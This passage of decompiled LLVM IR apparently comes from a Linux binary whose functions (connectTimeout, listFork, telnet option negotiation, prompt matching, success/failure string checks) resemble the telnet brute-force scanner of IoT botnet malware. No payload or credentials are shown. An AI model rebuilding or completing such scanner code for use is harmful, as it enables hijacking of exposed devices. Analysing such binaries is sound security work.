  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80492b8, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v4_80492cd = icmp eq i32 %arg2, 0
  %v6_80492cd = trunc i32 %arg2 to i8
  %v1_80492d1 = icmp eq i1 %v4_80492cd, false
  br i1 %v1_80492d1, label %dec_label_pc_80492e0, label %dec_label_pc_80492d3

dec_label_pc_80492d3:                             ; preds = %entry
  %v2_80492d6 = load i32, i32* %arg1, align 4
  %v1_80492db = call i32 @__libc_close(i32 %v2_80492d6)
  br label %dec_label_pc_80492e0

dec_label_pc_80492e0:                             ; preds = %entry, %dec_label_pc_80492d3
  %v1_80492e3 = add i32 %tmp3, 16
  %v2_80492e3 = inttoptr i32 %v1_80492e3 to i32*
  store i32 0, i32* %v2_80492e3, align 4
  %v3_80492f2 = add i32 %tmp3, 8
  %v4_80492f2 = inttoptr i32 %v3_80492f2 to i8*
  store i8 %v6_80492cd, i8* %v4_80492f2, align 1
  %v1_80492f8 = add i32 %tmp3, 24
  %v2_80492f8 = inttoptr i32 %v1_80492f8 to i32*
  %v3_80492f8 = load i32, i32* %v2_80492f8, align 4
  %v3_8049311 = inttoptr i32 %v3_80492f8 to i8*
  %v4_8049311 = call i32 @__GI_memset(i8* %v3_8049311, i32 0, i32 1024)
  ret i32 %v4_8049311

; uselistorder directives
  uselistorder i32 %tmp3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80492e0, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049318 = load i32, i32* @ebp, align 4
  store i32 %v0_8049318, i32* %stack_var_-4, align 4
  %v2_804932c = inttoptr i32 %arg1 to i32*
  %v3_804932c = call i32 @advance_state(i32* %v2_804932c, i32 0)
  %v1_8049334 = add i32 %arg1, 9
  %v2_8049334 = inttoptr i32 %v1_8049334 to i8*
  store i8 1, i8* %v2_8049334, align 1
  %v2_8049338 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049338, i32* @ebp, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804933a = load i32, i32* @ebp, align 4
  store i32 %v0_804933a, i32* %stack_var_-4, align 4
  %v4_804933a = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804933a, i32* @ebp, align 4
  %v4_804934e = call i32 @contains_string(i32 %arg1, i32* bitcast ([3 x i8*]* @global_var_805a3e0.23 to i32*))
  %v2_8049353 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049353, i32* @ebp, align 4
  ret i32 %v4_804934e

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049355 = load i32, i32* @ebp, align 4
  store i32 %v0_8049355, i32* %stack_var_-4, align 4
  %v4_8049355 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049355, i32* @ebp, align 4
  %v4_8049369 = call i32 @contains_string(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_805a3c0.31 to i32*))
  %v2_804936e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804936e, i32* @ebp, align 4
  ret i32 %v4_8049369

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049370 = load i32, i32* @ebp, align 4
  store i32 %v0_8049370, i32* %stack_var_-4, align 4
  %v4_8049370 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049370, i32* @ebp, align 4
  %v1_804937c = call i32 @contains_success(i32 %arg1)
  %v1_8049381 = icmp eq i32 %v1_804937c, 0
  %v1_8049383 = icmp eq i1 %v1_8049381, false
  br i1 %v1_8049383, label %dec_label_pc_80493a4, label %dec_label_pc_8049385

dec_label_pc_8049385:                             ; preds = %entry
  %v1_804938b = call i32 @contains_fail(i32 %arg1)
  %v1_8049390 = icmp ne i32 %v1_804938b, 0
  %. = zext i1 %v1_8049390 to i32
  br label %dec_label_pc_80493a4

dec_label_pc_80493a4:                             ; preds = %dec_label_pc_8049385, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_8049385 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_80493a9 = load i32, i32* @ebp, align 4
  store i32 %v0_80493a9, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80493c4

dec_label_pc_80493c4:                             ; preds = %dec_label_pc_80493c4, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_80493c4, %dec_label_pc_80493c4 ]
  %v4_80493c4 = add i32 %stack_var_-12.0, 1
  %v2_80493ca = mul i32 %v4_80493c4, 4
  %v5_80493cd = add i32 %v2_80493ca, %tmp5
  %v1_80493d0 = inttoptr i32 %v5_80493cd to i32*
  %v2_80493d0 = load i32, i32* %v1_80493d0, align 4
  %v1_80493d2 = icmp eq i32 %v2_80493d0, 0
  %v1_80493d4 = icmp eq i1 %v1_80493d2, false
  br i1 %v1_80493d4, label %dec_label_pc_80493c4, label %dec_label_pc_8049409.preheader

dec_label_pc_8049409.preheader:                   ; preds = %dec_label_pc_80493c4
  %v2_80493f4 = inttoptr i32 %arg1 to i8*
  %v5_804940f17 = icmp sgt i32 %v4_80493c4, 0
  br i1 %v5_804940f17, label %dec_label_pc_80493df, label %dec_label_pc_8049418

dec_label_pc_80493df:                             ; preds = %dec_label_pc_8049409.preheader, %dec_label_pc_8049406
  %storemerge118 = phi i32 [ %v4_8049406, %dec_label_pc_8049406 ], [ 0, %dec_label_pc_8049409.preheader ]
  %v2_80493e2 = mul i32 %storemerge118, 4
  %v5_80493e5 = add i32 %v2_80493e2, %tmp5
  %v1_80493e8 = inttoptr i32 %v5_80493e5 to i32*
  %v2_80493e8 = load i32, i32* %v1_80493e8, align 4
  store i32 %arg1, i32* @eax, align 4
  %v3_80493f4 = call i32 @strcasestr(i8* %v2_80493f4, i32 %v2_80493e8)
  %v1_80493f9 = icmp eq i32 %v3_80493f4, 0
  br i1 %v1_80493f9, label %dec_label_pc_8049406, label %dec_label_pc_8049418

dec_label_pc_8049406:                             ; preds = %dec_label_pc_80493df
  %v4_8049406 = add nuw nsw i32 %storemerge118, 1
  %v5_804940f = icmp slt i32 %v4_8049406, %v4_80493c4
  br i1 %v5_804940f, label %dec_label_pc_80493df, label %dec_label_pc_8049418

dec_label_pc_8049418:                             ; preds = %dec_label_pc_80493df, %dec_label_pc_8049406, %dec_label_pc_8049409.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_8049409.preheader ], [ 0, %dec_label_pc_8049406 ], [ 1, %dec_label_pc_80493df ]
  %v2_804941b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804941b, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049406, { 1, 0 }
  uselistorder i32 %storemerge118, { 1, 0 }
  uselistorder i32 %v4_80493c4, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8049418, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80493df, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049420 = load i32, i32* @edi, align 4
  store i32 %v0_8049420, i32* %stack_var_-8, align 4
  %v3_804943d = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049445 = or i32 %v3_804943d, 2048
  %v3_8049461 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049445)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_8049475 = trunc i32 %arg3 to i16
  %v2_8049475 = call i32 @htons(i16 %v1_8049475)
  store i32 %arg2, i32* @edx, align 4
  %v3_8049491 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8049496 = icmp eq i32 %v3_8049491, 0
  br i1 %v1_8049496, label %dec_label_pc_80494a9, label %dec_label_pc_8049619

dec_label_pc_80494a9:                             ; preds = %entry
  %v2_8049484 = ptrtoint i32* %stack_var_-40 to i32
  %v3_80494d1 = call i32 @__libc_connect(i32 %arg1, i32 %v2_8049484, i32 16)
  %v5_80494d9 = icmp slt i32 %v3_80494d1, 0
  %v1_80494dd = icmp eq i1 %v5_80494d9, false
  br i1 %v1_80494dd, label %dec_label_pc_80495d0, label %dec_label_pc_80494e3

dec_label_pc_80494e3:                             ; preds = %dec_label_pc_80494a9
  %v1_80494e3 = call i32 @__errno_location(i32 %v3_80494d1)
  %v1_80494e8 = inttoptr i32 %v1_80494e3 to i32*
  %v2_80494e8 = load i32, i32* %v1_80494e8, align 4
  %v9_80494ea = icmp eq i32 %v2_80494e8, 115
  %v1_80494ed = icmp eq i1 %v9_80494ea, false
  br i1 %v1_80494ed, label %dec_label_pc_8049619, label %dec_label_pc_80494f3

dec_label_pc_80494f3:                             ; preds = %dec_label_pc_80494e3
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049510 = ptrtoint i32* %stack_var_-168 to i32
  %tmp27 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049510, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049517 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v2_8049524 = udiv i32 %arg1, 32
  %v1_804952a = urem i32 %arg1, 32
  %v0_804952d = load i32, i32* @ebp, align 4
  %v2_804952d = mul nuw nsw i32 %v2_8049524, 4
  %v3_804952d = add nsw i32 %v2_804952d, -164
  %v4_804952d = add i32 %v3_804952d, %v0_804952d
  %v5_804952d = inttoptr i32 %v4_804952d to i32*
  %v6_804952d = load i32, i32* %v5_804952d, align 4
  %v9_804952d = shl i32 1, %v1_804952a
  %v12_804952d = or i32 %v6_804952d, %v9_804952d
  store i32 %v12_804952d, i32* %v5_804952d, align 4
  %v1_8049538 = add i32 %arg1, 1
  %v2_8049539 = ptrtoint i32* %stack_var_-176 to i32
  %v5_8049560 = call i32 @__libc_select(i32 %v1_8049538, i32 0, i32 %v2_8049510, i32 0, i32 %v2_8049539)
  %tmp28 = icmp slt i32 %v5_8049560, 1
  br i1 %tmp28, label %dec_label_pc_8049619, label %dec_label_pc_8049569

dec_label_pc_8049569:                             ; preds = %dec_label_pc_80494f3
  store i32 4, i32* %stack_var_-180, align 4
  %v2_8049573 = ptrtoint i32* %stack_var_-180 to i32
  %v2_804957d = ptrtoint i32* %stack_var_-184 to i32
  %v5_804959d = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_804957d, i32 %v2_8049573)
  %v3_80495a2 = load i32, i32* %stack_var_-184, align 4
  %v1_80495a8 = icmp eq i32 %v3_80495a2, 0
  br i1 %v1_80495a8, label %dec_label_pc_80495d0, label %dec_label_pc_8049619

dec_label_pc_80495d0:                             ; preds = %dec_label_pc_8049569, %dec_label_pc_80494a9
  %v3_80495e6 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80495ee = and i32 %v3_80495e6, -2049
  %v3_804960a = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_80495ee)
  br label %dec_label_pc_8049619

dec_label_pc_8049619:                             ; preds = %dec_label_pc_80494e3, %dec_label_pc_80494f3, %dec_label_pc_8049569, %entry, %dec_label_pc_80495d0
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_80495d0 ], [ 0, %entry ], [ 0, %dec_label_pc_8049569 ], [ 0, %dec_label_pc_80494f3 ], [ 0, %dec_label_pc_80494e3 ]
  %v2_8049625 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049625, i32* @edi, align 4
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049619, { 4, 2, 1, 0, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804962b = load i32, i32* @ebx, align 4
  store i32 %v0_804962b, i32* %stack_var_-8, align 4
  %v1_804962f = call i32 @__libc_fork(i32 %v0_804962b)
  %v4_8049637 = icmp eq i32 %v1_804962f, 0
  %v1_804963b = icmp eq i1 %v4_8049637, false
  br i1 %v1_804963b, label %dec_label_pc_8049648, label %dec_label_pc_804963d

dec_label_pc_804963d:                             ; preds = %entry
  br label %dec_label_pc_8049724

dec_label_pc_8049648:                             ; preds = %entry
  %v0_8049648 = load i32, i32* @global_var_805a6e8.32, align 8
  %v0_804964d = load i32, i32* @global_var_805a6ec.33, align 4
  %v1_8049653 = add i32 %v0_8049648, 1
  %v5_8049653 = icmp eq i32 %v0_8049648, -1
  %v2_8049656 = zext i1 %v5_8049653 to i32
  %v3_8049656 = add i32 %v2_8049656, %v0_804964d
  store i32 %v1_8049653, i32* @global_var_805a6e8.32, align 8
  store i32 %v3_8049656, i32* @global_var_805a6ec.33, align 4
  %v2_8049673 = mul i32 %v1_8049653, 4
  %v1_8049676 = add i32 %v2_8049673, 4
  %v1_804967c = call i32 @malloc(i32 %v1_8049676)
  br label %dec_label_pc_80496af

dec_label_pc_804968d:                             ; preds = %dec_label_pc_80496af, %dec_label_pc_80496e0
  %v2_8049690 = mul i32 %storemerge1, 4
  %v5_8049695 = add i32 %v2_8049690, %v1_804967c
  %v0_80496a0 = load i32, i32* @global_var_8060974.34, align 4
  %v2_80496a5 = add i32 %v0_80496a0, %v2_8049690
  %v1_80496a8 = inttoptr i32 %v2_80496a5 to i32*
  %v2_80496a8 = load i32, i32* %v1_80496a8, align 4
  %v2_80496aa = inttoptr i32 %v5_8049695 to i32*
  store i32 %v2_80496a8, i32* %v2_80496aa, align 4
  %v4_80496ac = add i32 %storemerge1, 1
  br label %dec_label_pc_80496af

dec_label_pc_80496af:                             ; preds = %dec_label_pc_8049648, %dec_label_pc_804968d
  %storemerge1 = phi i32 [ %v4_80496ac, %dec_label_pc_804968d ], [ 0, %dec_label_pc_8049648 ]
  %v0_80496bd = load i32, i32* @global_var_805a6e8.32, align 8
  %v0_80496c2 = load i32, i32* @global_var_805a6ec.33, align 4
  %v4_80496cc = icmp ne i32 %v0_80496bd, 0
  %v2_80496cf = zext i1 %v4_80496cc to i32
  %v3_80496cf = add i32 %v0_80496c2, -1
  %v4_80496cf = add i32 %v3_80496cf, %v2_80496cf
  store i32 %v4_80496cf, i32* @ebx, align 4
  %v10_80496db = icmp eq i32 %v4_80496cf, 0
  br i1 %v10_80496db, label %dec_label_pc_80496e0, label %dec_label_pc_804968d

dec_label_pc_80496e0:                             ; preds = %dec_label_pc_80496af
  %v1_80496cc = add i32 %v0_80496bd, -1
  %v10_80496eb = icmp ult i32 %storemerge1, %v1_80496cc
  br i1 %v10_80496eb, label %dec_label_pc_804968d, label %dec_label_pc_80496f0

dec_label_pc_80496f0:                             ; preds = %dec_label_pc_80496e0
  %v2_80496fb = mul i32 %v0_80496bd, 4
  %v5_80496fe = add i32 %v2_80496fb, %v1_804967c
  %v1_8049701 = add i32 %v5_80496fe, -4
  store i32 %v1_8049701, i32* @edx, align 4
  %v2_8049707 = inttoptr i32 %v1_8049701 to i32*
  store i32 %v1_804962f, i32* %v2_8049707, align 4
  %v0_8049709 = load i32, i32* @global_var_8060974.34, align 4
  %v1_8049711 = call i32 @free(i32 %v0_8049709)
  store i32 %v1_804967c, i32* @global_var_8060974.34, align 4
  store i32 %v1_804962f, i32* @ecx, align 4
  br label %dec_label_pc_8049724

dec_label_pc_8049724:                             ; preds = %dec_label_pc_804963d, %dec_label_pc_80496f0
  %v2_804972a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804972a, i32* @ebx, align 4
  ret i32 %v1_804962f

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8049690, { 1, 0 }
  uselistorder i32 %v1_804967c, { 2, 0, 1 }
  uselistorder i32 %v0_8049648, { 1, 0 }
  uselistorder label %dec_label_pc_8049724, { 1, 0 }
  uselistorder label %dec_label_pc_80496af, { 1, 0 }
  uselistorder label %dec_label_pc_804968d, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_804972d = load i32, i32* @ebp, align 4
  store i32 %v0_804972d, i32* %stack_var_-4, align 4
  %v1_8049736 = add i32 %arg2, 1
  %v1_8049737 = inttoptr i32 %v1_8049736 to i8*
  %v2_8049737 = load i8, i8* %v1_8049737, align 1
  %v9_8049740 = icmp ult i8 %v2_8049737, -5
  br i1 %v9_8049740, label %dec_label_pc_804984b, label %dec_label_pc_804974d

dec_label_pc_804974d:                             ; preds = %entry
  %v7_8049754 = icmp eq i8 %v2_8049737, -1
  br i1 %v7_8049754, label %dec_label_pc_8049756, label %dec_label_pc_8049770

dec_label_pc_8049756:                             ; preds = %dec_label_pc_804974d
  br label %dec_label_pc_804984b

dec_label_pc_8049770:                             ; preds = %dec_label_pc_804974d
  store i8 -1, i8* %stack_var_-5, align 1
  %v2_8049784 = ptrtoint i8* %stack_var_-5 to i32
  %v4_8049791 = call i32 @__libc_send(i32 %arg1, i32 %v2_8049784, i32 1, i32 16384)
  %v2_804979a = load i8, i8* %v1_8049737, align 1
  %v11_804979d = icmp eq i8 %v2_804979a, -4
  %v1_804979f = icmp eq i1 %v11_804979d, false
  br i1 %v1_804979f, label %dec_label_pc_80497a7, label %dec_label_pc_80497a1

dec_label_pc_80497a1:                             ; preds = %dec_label_pc_8049770
  store i8 -2, i8* %stack_var_-5, align 1
  br label %dec_label_pc_80497fd

dec_label_pc_80497a7:                             ; preds = %dec_label_pc_8049770
  %v2_80497ab = load i8, i8* %v1_8049737, align 1
  %v11_80497ae = icmp eq i8 %v2_80497ab, -2
  %v1_80497b0 = icmp eq i1 %v11_80497ae, false
  br i1 %v1_80497b0, label %dec_label_pc_80497b8, label %dec_label_pc_80497b2

dec_label_pc_80497b2:                             ; preds = %dec_label_pc_80497a7
  store i8 -4, i8* %stack_var_-5, align 1
  br label %dec_label_pc_80497fd

dec_label_pc_80497b8:                             ; preds = %dec_label_pc_80497a7
  %v2_80497bc = load i8, i8* %v1_8049737, align 1
  %v10_80497bf = icmp eq i8 %v2_80497bc, 3
  %v1_80497c1 = icmp eq i1 %v10_80497bf, false
  %v11_80497e8 = icmp eq i8 %v2_80497bc, -3
  %v1_80497ea = icmp eq i1 %v11_80497e8, false
  br i1 %v1_80497c1, label %dec_label_pc_80497e1, label %dec_label_pc_80497c3

dec_label_pc_80497c3:                             ; preds = %dec_label_pc_80497b8
  %. = select i1 %v1_80497ea, i8 -3, i8 -5
  store i8 %., i8* %stack_var_-5, align 1
  br label %dec_label_pc_80497fd

dec_label_pc_80497e1:                             ; preds = %dec_label_pc_80497b8
  %.3 = select i1 %v1_80497ea, i8 -2, i8 -4
  store i8 %.3, i8* %stack_var_-5, align 1
  br label %dec_label_pc_80497fd

dec_label_pc_80497fd:                             ; preds = %dec_label_pc_80497c3, %dec_label_pc_80497b2, %dec_label_pc_80497a1, %dec_label_pc_80497e1
  %v4_804981a = call i32 @__libc_send(i32 %arg1, i32 %v2_8049784, i32 1, i32 16384)
  %v1_8049822 = add i32 %arg2, 2
  %v4_804983f = call i32 @__libc_send(i32 %arg1, i32 %v1_8049822, i32 1, i32 16384)
  %v2_804984e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804984b

dec_label_pc_804984b:                             ; preds = %dec_label_pc_8049756, %dec_label_pc_80497fd, %entry
  %v2_804984e = phi i32 [ %v0_804972d, %dec_label_pc_8049756 ], [ %v2_804984e.pre, %dec_label_pc_80497fd ], [ %v0_804972d, %entry ]
  store i32 %v2_804984e, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-5, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder i8 -4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804984b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80497fd, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_804985e = ptrtoint i8* %arg1 to i32
  %v3_804986f = call i32 @_strlen(i8* %arg1)
  %v4_804986f = mul i32 %v3_804986f, -1
  %v1_8049875 = sub i32 0, %v4_804986f
  %v6_804989c = sub i32 %v4_804985e, %v4_804986f
  br label %dec_label_pc_8049924

dec_label_pc_804988c:                             ; preds = %dec_label_pc_80498df, %dec_label_pc_80498c7, %dec_label_pc_80498af, %dec_label_pc_8049897
  %v4_804988c = add nsw i32 %stack_var_-12.033, 1
  %v7_8049895 = icmp slt i32 %v4_804988c, %v1_8049875
  br i1 %v7_8049895, label %dec_label_pc_8049897, label %dec_label_pc_804988f.dec_label_pc_80498f7_crit_edge

dec_label_pc_804988f.dec_label_pc_80498f7_crit_edge: ; preds = %dec_label_pc_804988c, %dec_label_pc_804988f.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_804988f.preheader ], [ %v4_804988c, %dec_label_pc_804988c ]
  %.pre = sub i32 %v6_804989c, %stack_var_-12.0.lcssa
  %.pre10 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_80498f7

dec_label_pc_8049897:                             ; preds = %dec_label_pc_804988f.preheader, %dec_label_pc_804988c
  %stack_var_-12.033 = phi i32 [ %v4_804988c, %dec_label_pc_804988c ], [ %stack_var_-12.1, %dec_label_pc_804988f.preheader ]
  %v2_80498a4 = sub i32 %v6_804989c, %stack_var_-12.033
  %v1_80498a8 = inttoptr i32 %v2_80498a4 to i8*
  %v2_80498a8 = load i8, i8* %v1_80498a8, align 1
  %v4_80498ab = icmp eq i8 %v2_80498a8, 0
  br i1 %v4_80498ab, label %dec_label_pc_804988c, label %dec_label_pc_80498af

dec_label_pc_80498af:                             ; preds = %dec_label_pc_8049897
  %v2_80498c0 = load i8, i8* %v1_80498a8, align 1
  %v7_80498c3 = icmp eq i8 %v2_80498c0, 32
  br i1 %v7_80498c3, label %dec_label_pc_804988c, label %dec_label_pc_80498c7

dec_label_pc_80498c7:                             ; preds = %dec_label_pc_80498af
  %v2_80498d8 = load i8, i8* %v1_80498a8, align 1
  %v10_80498db = icmp eq i8 %v2_80498d8, 13
  br i1 %v10_80498db, label %dec_label_pc_804988c, label %dec_label_pc_80498df

dec_label_pc_80498df:                             ; preds = %dec_label_pc_80498c7
  %v2_80498f0 = load i8, i8* %v1_80498a8, align 1
  %v10_80498f3 = icmp eq i8 %v2_80498f0, 10
  br i1 %v10_80498f3, label %dec_label_pc_804988c, label %dec_label_pc_80498f7

dec_label_pc_80498f7:                             ; preds = %dec_label_pc_80498df, %dec_label_pc_804988f.dec_label_pc_80498f7_crit_edge
  %stack_var_-12.023 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_804988f.dec_label_pc_80498f7_crit_edge ], [ %stack_var_-12.033, %dec_label_pc_80498df ]
  %v1_8049908.pre-phi = phi i8* [ %.pre10, %dec_label_pc_804988f.dec_label_pc_80498f7_crit_edge ], [ %v1_80498a8, %dec_label_pc_80498df ]
  %v2_8049908 = load i8, i8* %v1_8049908.pre-phi, align 1
  %v6_804990e = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_80566e5.35 to i32)
  %v1_8049911 = inttoptr i32 %v6_804990e to i8*
  %v2_8049911 = load i8, i8* %v1_8049911, align 1
  %v15_8049914 = icmp eq i8 %v2_8049908, %v2_8049911
  %v1_8049916 = icmp eq i1 %v15_8049914, false
  br i1 %v1_8049916, label %dec_label_pc_8049921, label %dec_label_pc_804994e

dec_label_pc_8049921:                             ; preds = %dec_label_pc_80498f7
  %v4_8049921 = add i32 %storemerge3, 1
  br label %dec_label_pc_8049924

dec_label_pc_8049924:                             ; preds = %entry, %dec_label_pc_8049921
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.023, %dec_label_pc_8049921 ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v4_8049921, %dec_label_pc_8049921 ]
  %v3_8049938 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80566e5.35, i32 0, i32 0))
  %v7_804993f = icmp ult i32 %storemerge3, %v3_8049938
  br i1 %v7_804993f, label %dec_label_pc_804988f.preheader, label %dec_label_pc_804994e

dec_label_pc_804988f.preheader:                   ; preds = %dec_label_pc_8049924
  %v7_804989532 = icmp slt i32 %stack_var_-12.1, %v1_8049875
  br i1 %v7_804989532, label %dec_label_pc_8049897, label %dec_label_pc_804988f.dec_label_pc_80498f7_crit_edge

dec_label_pc_804994e:                             ; preds = %dec_label_pc_8049924, %dec_label_pc_80498f7
  %storemerge = phi i32 [ 1, %dec_label_pc_80498f7 ], [ 0, %dec_label_pc_8049924 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_804989c, { 1, 0 }
  uselistorder [6 x i8]* @global_var_80566e5.35, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049924, { 1, 0 }
  uselistorder label %dec_label_pc_804988f.dec_label_pc_80498f7_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_804999d = ptrtoint i32* %stack_var_-160 to i32
  %tmp27 = bitcast i32* %stack_var_-160 to i8*
  %v1_80499b7 = urem i32 %arg1, 32
  %v9_80499ba = shl i32 1, %v1_80499b7
  %v1_80499c5 = add i32 %arg1, 1
  %v2_80499c6 = ptrtoint i32* %stack_var_-168 to i32
  %v5_80499fd = ptrtoint i8* %arg6 to i32
  %v2_8049ad1 = inttoptr i32 %arg2 to i8*
  %v4_8049ada = icmp eq i32 %arg3, 0
  %v1_8049afb34 = add i32 %arg8, 2
  %v5_8049b0143 = icmp slt i32 %v1_8049afb34, %arg7
  br i1 %v5_8049b0143, label %dec_label_pc_8049b03.lr.ph, label %dec_label_pc_8049b1f

dec_label_pc_8049b03.lr.ph:                       ; preds = %entry
  %v2_80499b1 = udiv i32 %arg1, 32
  %v2_80499ba = mul nuw nsw i32 %v2_80499b1, 4
  %v3_80499ba = add nsw i32 %v2_80499ba, -156
  %tmp31 = icmp slt i32 %arg5, 1
  %tmp32 = icmp eq i1 %tmp31, false
  br label %dec_label_pc_8049b03

dec_label_pc_8049993:                             ; preds = %dec_label_pc_8049b11, %dec_label_pc_8049b03
  store i32 %v2_804999d, i32* @edi, align 4
  %v5_80499a4 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v0_80499ba = load i32, i32* @ebp, align 4
  %v4_80499ba = add i32 %v3_80499ba, %v0_80499ba
  %v5_80499ba = inttoptr i32 %v4_80499ba to i32*
  %v6_80499ba = load i32, i32* %v5_80499ba, align 4
  %v12_80499ba = or i32 %v6_80499ba, %v9_80499ba
  store i32 %v12_80499ba, i32* %v5_80499ba, align 4
  %v5_80499ed = call i32 @__libc_select(i32 %v1_80499c5, i32 %v2_804999d, i32 0, i32 0, i32 %v2_80499c6)
  %tmp28 = icmp slt i32 %v5_80499ed, 1
  br i1 %tmp28, label %dec_label_pc_8049b1f, label %dec_label_pc_80499fa

dec_label_pc_80499fa:                             ; preds = %dec_label_pc_8049993
  %v6_80499fd = add i32 %stack_var_-32.044, %v5_80499fd
  %v5_8049a00 = inttoptr i32 %v6_80499fd to i8*
  %v4_8049a20 = call i32 @__libc_recv(i32 %arg1, i32 %v6_80499fd, i32 1, i32 0)
  %v13_8049a28 = icmp eq i32 %v4_8049a20, -1
  br i1 %v13_8049a28, label %dec_label_pc_8049b3b, label %dec_label_pc_8049a2e

dec_label_pc_8049a2e:                             ; preds = %dec_label_pc_80499fa
  %v4_8049a2e = icmp eq i32 %v4_8049a20, 0
  %v1_8049a32 = icmp eq i1 %v4_8049a2e, false
  br i1 %v1_8049a32, label %dec_label_pc_8049a43, label %dec_label_pc_8049b3b

dec_label_pc_8049a43:                             ; preds = %dec_label_pc_8049a2e
  %v5_8049a46 = add i32 %v4_8049a20, %stack_var_-32.044
